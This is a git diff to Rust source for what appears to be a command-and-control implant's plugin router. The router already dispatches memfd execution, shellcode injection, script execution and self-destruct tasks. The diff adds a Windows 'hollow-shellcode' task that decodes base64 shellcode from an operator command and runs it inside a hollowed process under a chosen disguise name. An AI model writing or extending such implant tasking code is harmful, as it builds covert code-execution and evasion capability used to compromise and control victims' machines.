@@ -302,6 +302,7 @@ impl PluginRouter {
             "memfd-exec" => Self::handle_memfd_exec(task).await,
             "shell-script" => Self::handle_shell_script(task).await,
             "inject-shellcode" => Self::handle_inject_shellcode(task).await,
+            "hollow-shellcode" => Self::handle_hollow_shellcode(task).await,
             "powershell-script" => Self::handle_powershell_script(task).await,
             "python-script" => Self::handle_python_script(task).await,
             "self-destruct" => Self::handle_self_destruct().await,
@@ -418,6 +419,23 @@ impl PluginRouter {
         {
             let _ = task;
             Self::unsupported_on_platform("inject-shellcode", "Windows")
+        }
+    }
+    
+    /// Handle process hollowing shellcode execution
+    async fn handle_hollow_shellcode(task: PluginTask) -> CommandResult {
+        #[cfg(target_os = "windows")]
+        {
+            info!("🚨 Routing to shellcode hollowing (Windows)");
+            let target_exe = task.metadata
+                .as_ref()
+                .and_then(|m| m.fake_process_name.as_deref());
+            return crate::injection::ProcessInjector::hollow_shellcode(task.data, target_exe).await;
+        }
+        #[cfg(not(target_os = "windows"))]
+        {
+            let _ = task;
+            Self::unsupported_on_platform("hollow-shellcode", "Windows")
         }
     }
     
@@ -630,6 +648,34 @@ impl PluginRouter {
                     metadata: Some(PluginMetadata {
                         target_pid: Some(pid),
                         fake_process_name: None,
+                        app_domain_name: None,
+                        timeout_seconds: None,
+                        priority: None,
+                        detached: None,
+                    }),
+                    task_id,
+                    req_id,
+                })
+            }
+            "hollow-shellcode" => {
+                // Format: "target_exe|base64_shellcode" or just "base64_shellcode"
+                let (target_exe, shellcode_b64) = if content.contains('|') {
+                    let parts: Vec<&str> = content.splitn(2, '|').collect();
+                    (Some(parts[0].to_string()), parts[1])
+                } else {
+                    (None, content)
+                };
+                
+                let shellcode = base64::engine::general_purpose::STANDARD.decode(shellcode_b64.trim())
+                    .map_err(|e| format!("Invalid base64 shellcode: {}", e))?;
+                
+                Ok(PluginTask {
+                    execution_type: execution_type.to_string(),
+                    data: shellcode,
+                    args: vec![],
+                    metadata: Some(PluginMetadata {
+                        fake_process_name: target_exe,
+                        target_pid: None,
                         app_domain_name: None,
                         timeout_seconds: None,
                         priority: None,
